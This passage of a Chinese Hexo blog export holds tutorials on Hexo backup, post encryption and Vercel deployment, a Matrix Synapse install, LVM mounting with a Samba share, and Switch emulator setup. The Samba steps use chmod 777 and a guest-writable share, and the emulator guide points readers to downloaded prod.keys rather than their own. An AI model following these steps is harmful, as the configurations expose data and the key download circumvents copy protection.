class="code"><pre><span class="line">// 保存所有文件到暂存区</span><br><span class="line">git add .</span><br><span class="line">// 提交变更</span><br><span class="line">git commit -m <span class="string">'Backup'</span></span><br><span class="line">// 推送到github，分支为Backup</span><br><span class="line">git push origin backup</span><br></pre></td></tr></tbody></table></figure><h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2><p>可能会提示如下错误</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access <span class="string">'https://github.com/xxx/xxx.github.io.git/'</span>: GnuTLS recv error (-110): The TLS connection was non-properly terminated.</span><br></pre></td></tr></tbody></table></figure><p>执行下面的指令即可正常推送</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> git.proxy</span><br></pre></td></tr></tbody></table></figure><h2 id="还原"><a class="anchor" href="#还原">#</a> 还原</h2><ol><li>克隆 backup 分支到本地</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b backup https://github.com/maxshiro/maxshiro.github.io.git</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>安装依赖</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install</span><br></pre></td></tr></tbody></table></figure><h1 id="2-博客加密"><a class="anchor" href="#2-博客加密">#</a> 2. 博客加密</h1><ul><li>有时候我们可能需要写一些私密的博客，通过密码验证的方式让人不能随意浏览。</li><li>这在 wordpress，emlog 或其他博客系统中都很容易实现，然而 hexo 除外。😦</li><li>为了解决这个问题，我们需要安装 “hexo-blog-encrypt” 扩展。</li></ul><h2 id="安装指令"><a class="anchor" href="#安装指令">#</a> 安装指令</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-blog-encrypt</span><br></pre></td></tr></tbody></table></figure><h2 id="快速使用"><a class="anchor" href="#快速使用">#</a> 快速使用</h2><p>将 password 标签添加到您的 Front-matter 里，就像这样：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxx</span><br><span class="line"><span class="built_in">date</span>: 2022-08-26 17:34:59</span><br><span class="line">password: 233</span><br><span class="line">tags: xxx</span><br><span class="line">---</span><br></pre></td></tr></tbody></table></figure><h2 id="特性"><a class="anchor" href="#特性">#</a> 特性</h2><ul><li>一旦你输入了正确的密码，它就会被存储在本地浏览器的 localStorage 中。按个按钮，密码将会被清空。若博客中有脚本，它将被正确地执行。</li><li>支持按标签加密。</li><li>所有的核心功能都是由原生的 API 所提供的。在 Node.js 中，我们使用 Crypto。在浏览器中，我们使用 Web Crypto API。</li><li>PBKDF2，SHA256 被用作复制密钥，AES256-CBC 被用作加解密，我们还使用 HMAC 来验证密文的来源，并确保其纠正。</li><li>广泛地使用 Promise 来进行异步操作，从而确保线程不被杜塞。</li><li>过时的浏览器将无法正常显示，因此，请升级您的浏览器。</li></ul><h1 id="3-博客加速"><a class="anchor" href="#3-博客加速">#</a> 3. 博客加速</h1><blockquote><p>于 2022 年 11 月测试 vercel.app 已经被墙了，但是还可以通过自备域名的方式。</p></blockquote><p>使用 Vercel 加速 Hexo 博客访问速度。<br>如果你想让您的博客更快的更新，那么可以采取这种方法的同时，也可以加速你的博客。<br>该方法适用于已经使用我的方法将博客源文件备份到了 github 的。</p><h2 id="步骤"><a class="anchor" href="#步骤">#</a> 步骤</h2><ol><li><a href="http://xn--vercel-oi2ls3t.com">打开 vercel.com</a>, 这个域名没有被墙。登陆的时候选择 github 方式。<div class="tag-plugin image"><div class="image-bg"><img src="/img/hexoplugin/20221116141135.png" fancybox="true"></div></div>  </li><li>创建新项目，选择 git 仓库中已存在的项目，然后选 Deploy。</li><li>创建完成后就可以通过  <code>你项目名称.vercel.app</code>  访问了。但是目前 vercel.app 已经被墙了，所以还需要在设置里添加自己的域名。</li><li>切换到自己的域名控制台里添加一条 cname 记录，指向这个地址  <code>cname-china.vercel-dns.com</code>  。</li><li>将 Git Branch 里的内容改为存放自己博客备份的分支，比如我的就是 backup 分支。同时也可以将分配给你的二级域名也改成这个分支。<div class="tag-plugin image"><div class="image-bg"><img src="/img/hexoplugin/20221116144428.png" fancybox="true"></div></div>  </li><li>切换到 Git 项目，将 Production Branch 也更改为 backup 分支。<div class="tag-plugin image"><div class="image-bg"><img src="/img/hexoplugin/20221116144502.png" fancybox="true"></div></div>  </li><li>此时如果你的 backup 分支如果有更新，那么 vercel 会自动克隆你的源文件然后编译更新 cache。</li><li>使用这种方法独立于 github page。只有当你 hexo d 之后源博客才会更新。</li></ol><h2 id="保护博客源码内容"><a class="anchor" href="#保护博客源码内容">#</a> 保护博客源码内容</h2><p>如果你认为这种方式要更好一些，当然你也可以选择直接关掉 github page 并将仓库设置为 private，这样别人就无法轻易获取您博客的源代码了。</p><h1 id="写作流程"><a class="anchor" href="#写作流程">#</a> 写作流程</h1><h2 id="第一次使用"><a class="anchor" href="#第一次使用">#</a> 第一次使用</h2><ol><li>安装 nodejs，git，hexo，npm</li><li>git clone 仓库链接</li><li>cd 到目录然后 cnpm install</li><li>撰写博客</li></ol><h2 id="通过github-page"><a class="anchor" href="#通过github-page">#</a> 通过 github page</h2><ol><li>撰写博客</li><li>保存到 github。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 保存所有文件到暂存区</span><br><span class="line">git add .</span><br><span class="line">// 提交变更</span><br><span class="line">git commit -m <span class="string">'Backup'</span></span><br><span class="line">// 推送到github，分支为Backup</span><br><span class="line">git push origin backup</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>生成并提交网页。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 生成静态网页</span><br><span class="line">hexo g</span><br><span class="line">// 生成目录文件</span><br><span class="line">hexo algolia</span><br><span class="line">// 打开本地服务器预览</span><br><span class="line">hexo s</span><br><span class="line">// 提交到github page</span><br><span class="line">hexo d</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>等待网页更新。</li></ol><h2 id="通过vercelcom"><a class="anchor" href="#通过vercelcom">#</a> <a href="http://xn--vercel-2u3sdu.com">通过 vercel.com</a></h2><ol><li>撰写博客</li><li>保存到 github。</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 保存所有文件到暂存区</span><br><span class="line">git add .</span><br><span class="line">// 提交变更</span><br><span class="line">git commit -m <span class="string">'Backup'</span></span><br><span class="line">// 推送到github，分支为Backup</span><br><span class="line">git push origin backup</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>等待网页更新。</li></ol><h1 id="测试"><a class="anchor" href="#测试">#</a> 测试</h1><figure class="highlight java"><figcaption><span>java</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">...</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span> (System.in);</span><br><span class="line"><span class="comment">// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。</span></span><br><span class="line">System.out.println (in.nextLine ());</span><br><span class="line">System.out.println (<span class="string">"Hello"</span> + <span class="string">"world."</span>);</span><br></pre></td></tr></tbody></table></figure><p>原本用于日语汉字假名注音，但别的注音也可以。<br>为了兼容性，采用 markdown-it-ruby 的基本格式： <ruby>文字<rp> (</rp><rt>注音</rt><rp>)</rp></ruby> ，并且为了兼容表格，将分隔符由 | 换成了 ^ 。<br>注音分隔基于 furigana-markdown-it 显示说明看这里</p><p><ruby>取<rp> (</rp><rt>と</rt><rp>)</rp> り<rt></rt>返<rp> (</rp><rt>かえ</rt><rp>)</rp> す<rt></rt></ruby>取とり返かえす<br><ruby>可愛<rp> (</rp><rt>かわい</rt><rp>)</rp> い<rt></rt>犬<rp> (</rp><rt>いぬ</rt><rp>)</rp></ruby>可愛かわいい犬いぬ<br><ruby>可<rp> (</rp><rt>か</rt><rp>)</rp> 愛<rp> (</rp><rt>わい</rt><rp>)</rp> い<rt></rt>犬<rp> (</rp><rt>いぬ</rt><rp>)</rp></ruby>可か愛わいい犬いぬ<br><ruby>アクセラレータ<rp> (</rp><rt>accelerator</rt><rp>)</rp></ruby>アクセラレータ accelerator<br><ruby>accelerator<rp>(</rp><rt>アクセラレータ</rt><rp>)</rp></ruby>accelerator アクセラレータ<br><ruby>食<rp> (</rp><rt>た</rt><rp>)</rp> べる<rt></rt></ruby>食たべる<br><ruby>食べる<rp> (</rp><rt>たべる</rt><rp>)</rp></ruby>食べるたべる<br><ruby>あ<rt>●</rt>い<rt>●</rt>う<rt>●</rt>え<rt>●</rt>お<rt>●</rt></ruby>あ●い●う●え●お●<br><ruby>あ<rt>❤</rt>い<rt>❤</rt>う<rt>❤</rt>え<rt>❤</rt>お<rt>❤</rt></ruby>あ❤い❤う❤え❤お❤<br><ruby>常用账号<rp> (</rp><rt>contact</rt><rp>)</rp></ruby>常用账号 contact</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plugin </tag>
            
            <tag> hexo </tag>
            
            <tag> backup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos安装MatrixSynapseChat简易教程</title>
      <link href="/ug/212907/"/>
      <url>/ug/212907/</url>
      
        <content type="html"><![CDATA[<h2 id="先安装前置"><a class="anchor" href="#先安装前置">#</a> 先安装前置</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install libtiff-devel libjpeg-devel libzip-devel freetype-devel libwebp-devel libxml2-devel libxslt-devel libpq-devel python3-virtualenv libffi-devel openssl-devel python3-devel</span><br><span class="line">yum groupinstall <span class="string">"Development Tools"</span></span><br></pre></td></tr></tbody></table></figure><h2 id="使用root账户接入您的centos找到合适的位置开始操作"><a class="anchor" href="#使用root账户接入您的centos找到合适的位置开始操作">#</a> 使用 root 账户接入您的 centos，找到合适的位置开始操作</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> syn</span><br></pre></td></tr></tbody></table></figure><h3 id="依次执行以下指令"><a class="anchor" href="#依次执行以下指令">#</a> 依次执行以下指令</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">virtualenv -p python3 ./env &amp;&amp; <span class="built_in">source</span> ./env/bin/activate</span><br><span class="line">python3 -m pip install --upgrade pip &amp;&amp; python3 -m pip install --upgrade setuptools &amp;&amp; python3 -m pip install psycopg2-binary</span><br><span class="line">python3 -m pip install matrix-synapse                         //安装synapse</span><br><span class="line">python3 -m pip install -U matrix-synapse                    //更新synapse</span><br></pre></td></tr></tbody></table></figure><h2 id="将下列指令拷贝到控制台执行自动生成homeserveryaml"><a class="anchor" href="#将下列指令拷贝到控制台执行自动生成homeserveryaml">#</a> 将下列指令拷贝到控制台执行，自动生成 homeserver.yaml</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m synapse.app.homeserver \</span><br><span class="line">    --server-name im.axro.top \</span><br><span class="line">    --config-path homeserver.yaml \</span><br><span class="line">    --generate-config \</span><br><span class="line">    --report-stats=no</span><br></pre></td></tr></tbody></table></figure><h2 id="编辑生成homeserveryaml"><a class="anchor" href="#编辑生成homeserveryaml">#</a> 编辑生成 <code>homeserver.yaml</code></h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enable_registration: <span class="literal">true</span></span><br><span class="line">suppress_key_server_warning: <span class="literal">true</span></span><br><span class="line">bind_addresses: [<span class="string">'::1'</span>, <span class="string">'0.0.0.0'</span>]</span><br></pre></td></tr></tbody></table></figure><h2 id="启动关闭服务器"><a class="anchor" href="#启动关闭服务器">#</a> 启动 / 关闭服务器</h2><h4 id="注意要先进入虚拟python环境"><a class="anchor" href="#注意要先进入虚拟python环境">#</a> 注意要先进入虚拟 python 环境</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ./env/bin/activate</span><br><span class="line"></span><br><span class="line">synctl start</span><br><span class="line">synctl stop</span><br></pre></td></tr></tbody></table></figure><h2 id="退出虚拟环境"><a class="anchor" href="#退出虚拟环境">#</a> 退出虚拟环境</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></tbody></table></figure><h2 id="配置反代"><a class="anchor" href="#配置反代">#</a> 配置反代</h2><p>进入宝塔面板新建静态网站，配置 ssl，配置反向代理地址为 <code>https://localhost:8008</code> , 保存即可.</p>]]></content>
      
      
      
        <tags>
            
            <tag> nextcloud </tag>
            
            <tag> 聊天室 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决linux下挂载其他linux硬盘的问题并创建smb局域网共享</title>
      <link href="/ug/211502/"/>
      <url>/ug/211502/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><blockquote><p>之前用来当作小型服务器的笔记本终于被我给淘汰了。已经关机了好久。最近买了块 <code>SATA</code>  硬盘盒，想要将这台笔记本内的数据备份出来并把硬盘用作其他用途。一切连接好后发现无法挂载，遂百度了一会查出了如下方法...</p></blockquote><h1 id="故障复现"><a class="anchor" href="#故障复现">#</a> 故障复现</h1><ol><li>连接 linux 系统，提示插入硬盘. <code>/dev</code>  分区下出现硬盘编号</li><li>执行如下指令</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">mkdir</span> backup</span><br><span class="line">mount /dev/sdc/ /backup/</span><br></pre></td></tr></tbody></table></figure><p>报错</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount: unknown filesystem <span class="built_in">type</span> <span class="string">'LVM2_member'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="解决方法-debian系"><a class="anchor" href="#解决方法-debian系">#</a> 解决方法 //Debian 系</h1><ol><li>执行如下指令安装 lvm2 并扫描查看以挂载的磁盘</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lvm2</span><br><span class="line">sudo vgscan</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>发现如下字样后找到对应的 <code>xxx</code></li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Found volume group <span class="string">"xxx"</span> using metadata <span class="built_in">type</span> lvm2</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>设为活动状态并查看可挂载的分区</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vgchange -ay xxx</span><br><span class="line">sudo lvs</span><br><span class="line">LV     VG   Attr   LSize  Origin Snap%  Move Log Copy%  Convert</span><br><span class="line">data        xxx             -wi-a-              34.19G      </span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>挂载对应分区</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount /dev/xxx/data/ /backup/</span><br></pre></td></tr></tbody></table></figure><blockquote><p>至此已经解决了问题，如果你还想把这块硬盘里的数据共享出去，比如共享给局域网内的 windows 主机，那就接着看..</p></blockquote><h1 id="设置smb"><a class="anchor" href="#设置smb">#</a> 设置 SMB</h1><ol><li>先更新一下</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>安装 Samba 服务</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install samba samba-common</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>配置共享目录</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 新建目录</span><br><span class="line">sudo <span class="built_in">mkdir</span> /home/db</span><br><span class="line">// 更改目录权限</span><br><span class="line">sudo <span class="built_in">chmod</span> 777 /home/db/ -R</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>添加账户</li></ol><blockquote><p>要注意添加的账户需要是系统内已存在的账户</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 后面的pi为系统的用户名</span><br><span class="line">sudo smbpasswd -a pi</span><br></pre></td></tr></tbody></table></figure><blockquote><p>输入两次密码后创建成功</p></blockquote><ul><li>创建系统账户</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// -m参数为添加/home/username目录,username更改为你要创建的用户名.</span><br><span class="line">sudo useradd -m username</span><br><span class="line">// 更改账户密码</span><br><span class="line">sudo passwd username</span><br><span class="line">// 删除用户</span><br><span class="line">sudo userdel -r username</span><br><span class="line">// 更改登录zhanghu</span><br><span class="line">su -username</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>配置 samba</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 建议先备份一下</span><br><span class="line">sudo <span class="built_in">cp</span> /etc/samba/smb.conf /etc/samba/smb.conf.bak</span><br><span class="line">// 编辑</span><br><span class="line">sudo vim /etc/samba/smb.conf</span><br></pre></td></tr></tbody></table></figure><blockquote><p>在文件最后添加</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[database] </span><br><span class="line">    comment = 23333333  <span class="comment"># 描述</span></span><br><span class="line">path = /home/db/    <span class="comment"># 目录</span></span><br><span class="line">public = <span class="built_in">yes</span>        <span class="comment"># 是否允许guest用户访问</span></span><br><span class="line">writable = <span class="built_in">yes</span>      <span class="comment"># 是否允许读写</span></span><br><span class="line">workgroup = WORKGROUP  <span class="comment"># 工作组</span></span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>重启 samba 服务</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service smbd restart</span><br></pre></td></tr></tbody></table></figure><p>然后在 windows 里面映射就行了</p><h1 id="借鉴摘抄"><a class="anchor" href="#借鉴摘抄">#</a> 借鉴 (摘抄)</h1><p><a href="https://blog.csdn.net/mvp_Dawn/article/details/105847485" title="ubuntu 20.04 安装配置Samba服务，Windows 和 linux协同工作">ubuntu 20.04 安装配置 Samba 服务，Windows 和 linux 协同工作</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Switch模拟器的安装使用以及游戏文件获取和处理。</title>
      <link href="/ug/211224/"/>
      <url>/ug/211224/</url>
      
        <content type="html"><![CDATA[<div class="tag-plugin image"><div class="image-bg"><img src="/img/ns/1.gif" fancybox="true"></div></div><h1 id="引子"><a class="anchor" href="#引子">#</a> 引子</h1><blockquote><p>本篇文章起源于之前我想玩 mega39 而写，现在我对这些内容有了新的理解，再次进行更改记录。</p></blockquote><p><strong>Ryujinx 和 yuzu 模拟器任选一个即可。如果游戏运行有问题再尝试另外一个</strong></p><h1 id="配置要求"><a class="anchor" href="#配置要求">#</a> 配置要求</h1><blockquote><p><code>ryujinx</code>  和  <code>yuzu</code>  都适用。</p></blockquote><h2 id="软体"><a class="anchor" href="#软体">#</a> 软体:</h2><blockquote><p>建议运行 Windows 10 1803 或较新版本以获得最佳性能。这里仅列出 Win10 64 位 要求.</p><p>如果你要在 linux 下使用则建议您找找其他的教程，我目前还没有使用 linux 的机器。</p></blockquote><hr><blockquote><p>硬体要求适用于所有 Switch 游戏.</p></blockquote><h2 id="cpu"><a class="anchor" href="#cpu">#</a> CPU:</h2><blockquote><p>任何支持 FMA 指令集的 x86_64 CPU。 建议使用 6 个或更多线程。</p></blockquote><ul><li>最小: Intel Core i5-4430 / AMD Ryzen 3 1200</li><li>推荐: Intel Core i5-10400 / AMD Ryzen 5 3600</li></ul><h2 id="专用显示卡"><a class="anchor" href="#专用显示卡">#</a> 专用显示卡:</h2><p><strong>必须使用 OpenGL 4.6 或 Vulkan 1.1 兼容硬件和驱动程序。 推荐使用支持半浮点以及 4GB 显示内存。</strong></p><blockquote><p>大多数游戏都可以在 Fermi 系列（400 系列）或更高版本的 Nvidia GPU 上运行，但强烈建议至少使用 Pascal（1000 系列）。</p></blockquote><ul><li>最小: NVIDIA GeForce GT 1030 2GB / AMD Radeon RX 550 2GB</li><li>推荐: NVIDIA GeForce GTX 1650 4GB / AMD Radeon RX Vega 56 8GB</li></ul><h2 id="集成显示卡"><a class="anchor" href="#集成显示卡">#</a> 集成显示卡:</h2><blockquote><p>集成显卡的性能表现很差。 独立显卡能够在所有场景中产生更好的效果。 这里列出 iGPU 支持。</p></blockquote><ul><li>最小: Intel HD Graphics 520 / AMD Radeon Vega 3</li><li>推荐: Intel UHD Graphics 750 / AMD Radeon Vega 7</li></ul><h2 id="内存"><a class="anchor" href="#内存">#</a> 内存:</h2><blockquote><p>因为集成 GPU 调用内存作为显存 (VRAM)，所以在此配置中的内存要求要高些。</p></blockquote><ul><li>最小专用显卡内存: 8GB</li><li>最小集成显卡内存: 12GB</li><li>推荐: 16GB</li></ul><hr><h1 id="安装前"><a class="anchor" href="#安装前">#</a> 安装前</h1><blockquote><p>如果你已经有了 Switch 则可以提取自己的。我就不具体写教程了。可以看看 Ryujinx 官方提供的。</p></blockquote><ul><li><p>prod.key 导出:<a href="https://github.com/Ryujinx/Ryujinx/wiki/Keys">https://github.com/Ryujinx/Ryujinx/wiki/Keys</a></p></li><li><p>固件导出:<a href="https://github.com/Ryujinx/Ryujinx/wiki/Firmware-Dumping-Guide-(hbmenu-&amp;-Goldleaf)">https://github.com/Ryujinx/Ryujinx/wiki/Firmware-Dumping-Guide-(hbmenu-&amp;-Goldleaf)</a></p></li></ul><h1 id="下载安装-yuzu-软件"><a class="anchor" href="#下载安装-yuzu-软件">#</a> 下载安装 yuzu 软件。</h1><blockquote><p>下列操作建议在科学上网环境下进行.</p></blockquote><ol><li>去 <a href="https://yuzu-emu.org/">https://yuzu-emu.org/</a> 下载最新的 yuzu 模拟器。并运行软体.<blockquote><p>我在下方的链接里也放了捐赠版也就是 EA，但是版本不会经常更新。如果安装出现问题可以试试。<br>yuzu EA 版本还支持多人联机的功能，但是需要你使用梯子才可以比较好的使用。</p></blockquote></li></ol><ul><li>yuzu Early Access 这个版本是只有捐赠用户才可以使用，如果条件支持可以去支持一波.</li><li>普通版本已经足够使用.</li></ul><ol start="2"><li>由于安装的时候会连接 Github 服务器下载文件，因此强烈建议使用全局科学上网.</li><li>安装完成后直接启动，提示缺少 key 文件，选 OK :</li></ol><blockquote><div class="tag-plugin image"><div class="image-bg"><img src="/img/ns/20220920215251.png" fancybox="true"></div></div>  </blockquote><ol><li><p>然后会跳出提示框问是否帮助改进 yuzu , 我们点 no.</p></li><li><p>此时已经完成安装了模拟器本体，不过想要正常运行游戏还需要做以下操作</p></li><li><p>执行工具栏中的  <code>文件</code>  -&gt;  <code>Open yuzu Folder</code>  打开 yuzu 软件自动创建的目录，然后在下方的链接里找到 key 文件夹，下载  <code>prod.keys</code>  文件扔进 keys 文件夹内.</p></li><li><p>然后再次打开 yuzu 就不会再弹出刚才的对话框了.</p></li></ol><h1 id="下载安装-ryujinx-软件"><a class="anchor" href="#下载安装-ryujinx-软件">#</a> 下载安装 Ryujinx 软件</h1><blockquote><p>同样下列操作建议在科学上网环境下进行.</p></blockquote><ol><li>打开 <a href="https://ryujinx.org/">https://ryujinx.org/</a> ，选择上方 Download 下载最新编译版本解压。并运行软体.<blockquote><p><a href="https://github.com/Ryujinx/Ryujinx/actions">Action</a> 如果你有能力可以直接到 Ryujin 模拟器 github 获取最新测试版的编译版本。</p></blockquote></li><li>打开 <a href="https://darthsternie.net/switch-firmwares/">https://darthsternie.net/switch-firmwares/</a> ，下载最新的固件到本地备用。</li><li>在模拟器最上方依次点击 <code>File</code>  →  <code>Open Ryujinx Folder</code> 。</li><li>进入 system 文件夹，在下方的链接里找到 key 文件夹，下载  <code>prod.keys</code>  文件扔进 keys 文件夹内.</li><li>在模拟器最上方依次点击  <code>Tools</code>  →  <code>Install Firmware</code>  →  <code>Install a firmware from XCI or ZIP</code> , 选择刚才下载的固件文件点击  <code>open</code> 。<ol><li>若出现报错，如下图所示，是因为  <code>prod.keys</code>  文件与  <code>Firmware</code>  不匹配，prod.keys 文件要与 Firmware 匹配才可以安装成功，因此你若想安装新的 firmware，则需要你自己去找对应的 prod.keys<blockquote><div class="tag-plugin image"><div class="image-bg"><img src="/img/ns/20221107165255.png" fancybox="true"></div></div>  </blockquote></li></ol></li><li>添加游戏目录，依次点击  <code>Options</code>  →  <code>Settings</code>  ，打开设置，在  <code>General</code>  选项卡，点击  <code>Add</code></li><li>在弹出的窗口中选择你的游戏目录，然后点击右下角的  <code>Add</code> ，然后点击 <code>Save</code> 。</li></ol><hr><h1 id="模拟器设置yuzu和ryujinx部分内容通用有区别我会标注出来"><a class="anchor" href="#模拟器设置yuzu和ryujinx部分内容通用有区别我会标注出来">#</a> 模拟器设置（yuzu 和 ryujinx 部分内容通用，有区别我会标注出来）</h1><p>执行  <code>模拟(E)</code>  -&gt;  <code>Configure...</code>  打开 yuzu 设置.</p><h2 id="通用选单"><a class="anchor" href="#通用选单">#</a> 通用选单</h2><ul><li>Interface 下第一项（interface language）可以更改显示语言，建议先把这个改为中文。</li><li>勾选  <code>多核 CPU 仿真</code>  可在一定程度上改进性能.</li><li><code>运行速度限制</code>  更改到 100% 可解决某些游戏没有帧数限制导致游戏速度异常。</li><li>网络选单下可以填写你注册 yuzu 网站后的令牌以此来进行联机。</li></ul><h2 id="系统选单"><a class="anchor" href="#系统选单">#</a> 系统选单</h2><ul><li>在 系统 选单，系统 选项卡，系统设置 框架内根据需要设置  <code>语言</code> ， <code>地区</code>  和  <code>时区</code> ，这里推荐  <code>中文</code> ， <code>中国</code> ， <code>中文</code>  不然默认语言看不懂 (</li><li>配置选项卡可以更改个人信息但是没什么用。</li><li>网络选项卡若要使用联机服务则需要选择一种连接方式，通常是以太网或者 WLAN。这取决于你当前使用什么方式上网。</li></ul><h2 id="图形选单"><a class="anchor" href="#图形选单">#</a> 图形选单</h2><ul><li><code>API</code>  任意选择，N 卡选 Vulkan 有时候也更好。</li><li>如果你的设备是笔记本，那你需要更改  <code>设备</code>  为自己的独立显卡。</li></ul><h2 id="控制选单"><a class="anchor" href="#控制选单">#</a> 控制选单</h2><ul><li><code>输入设备</code>  内可以选择自己的手柄 / 控制器。唯一需要注意的是 switch 按键的 ab/xy 按键是反过来的，建议游玩的时候别看手柄。</li><li>最后点击  <code>OK</code>  即可完成配置...</li></ul><h1 id="下载游戏"><a 